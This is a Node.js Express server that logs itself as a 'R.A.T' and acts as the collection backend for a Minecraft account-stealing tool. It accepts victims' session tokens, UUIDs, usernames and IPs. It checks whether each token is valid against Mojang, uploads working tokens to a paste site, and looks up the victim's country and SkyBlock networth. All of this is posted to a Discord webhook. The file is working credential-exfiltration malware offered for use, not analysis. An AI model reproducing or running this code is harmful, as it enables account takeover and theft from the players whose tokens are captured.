const getProfiles = require('./utils/networth');
require("dotenv").config();
const { post } = require("axios");
const express = require("express");
const app = express();
const expressip = require("express-ip");
const port = process.env.PORT || 8080;

app.use(expressip().getIpInfoMiddleware);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post("/", async (req, res) => {
    const country = await fetchCountry(req.body.ip);

    const response = await post("https://sessionserver.mojang.com/session/minecraft/join", {
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    })
    .then(res => {
        if (res.status === 204) {
            return { status: "License" };
        } else if (res.status === 403) {
            console.log(`Non-License detected. Response data: ${JSON.stringify(res.data)}`);
            return { status: "Non-License", error: res.data };
        } else {
            console.log(`Unexpected status: ${res.status}`);
            return { status: `Unexpected status: ${res.status}` };
        }
    }).catch(error => {
        console.error(`Request failed with error: ${error.message}`);
        if (error.response) {
            console.error(`Response data: ${JSON.stringify(error.response.data)}`);
            return { status: "Request failed", error: error.response.data };
        }
        return { status: "Request failed" };
    });

    let webhookData = {
        content: `@everyone - ${req.body.username}`,
        embeds: [{
            fields: [],
            color: 2175365,
            footer: {
                "text": "😈 Autistic? 😈",
            },
            timestamp: new Date()
        }],
        attachments: []
    };

    if (response.status === "Non-License") {
        console.log("Adding Non-License data to webhook.");
        webhookData.embeds[0].fields.push(
            { name: 'License Status', value: `**\`\`\`${response.status}\`\`\`**`, inline: false },
            { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false },
            { name: 'Error', value: `**\`\`\`${response.error.error}\`\`\`**`, inline: false },
            { name: 'Path', value: `**\`\`\`${response.error.path}\`\`\`**`, inline: false }
        );
    } else if (response.status === "License") {
        console.log("Adding License data to webhook.");
        const [shorttoken, profiles] = await Promise.all([
            post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
            getProfiles(req.body.uuid).then(profileData => {
                if (profileData) {
                    return Object.values(profileData.profiles).map(profile => 
                        `[${profile.sblvl}]${profile.unsoulboundNetworth} - ${profile.gamemode}`
                    ).join('\n');
                }
                return '';
            })
        ]);

        const checkToken = shorttoken === 'Error uploading' ? 'Invalid Token' : `[Minecraft Token](https://hst.sh/${shorttoken})`;
        const planckeUrl = `[Plancke.io](https://plancke.io/hypixel/player/stats/${req.body.username})`;
        const cryptUrl = `[SkyCrypt](https://sky.shiiyu.moe/stats/${req.body.username})`;

        webhookData.embeds[0].fields.push(
            { name: 'Statistics', value: `****${planckeUrl}**** ****${cryptUrl}****`, inline: false },
            { name: 'Token', value: `****${checkToken}****`, inline: true },
            { name: 'Profiles', value: `**\`\`\`${profiles}\`\`\`**`, inline: false },
            { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false }
        );
        webhookData.embeds[0].fields.push({
            name: 'License Status', value: `**\`\`\`${response.status}\`\`\`**`, inline: false
        });
    } else {
        console.log(`Handling unexpected status: ${response.status}`);
        webhookData.embeds[0].fields.push(
            { name: 'Status', value: `**\`\`\`${response.status}\`\`\`**`, inline: false },
            { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false }
        );
    }

    try {
        await post(process.env.WEBHOOK, webhookData);
    } catch (err) {
        console.error("Error sending webhook:", err.message);
    }

    res.send("OK");
});

app.listen(port, () => {
    console.log(`[R.A.T] Listening at port ${port}`);
});

async function fetchCountry(ip) {
    const apiUrl = `http://ip-api.com/json/${ip}`;
    try {
        const response = await fetch(apiUrl);
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        const data = await response.json();
        return data.country;
    } catch (error) {
        console.error('Error fetching country:', error);
        return 'Unknown';
    }
}
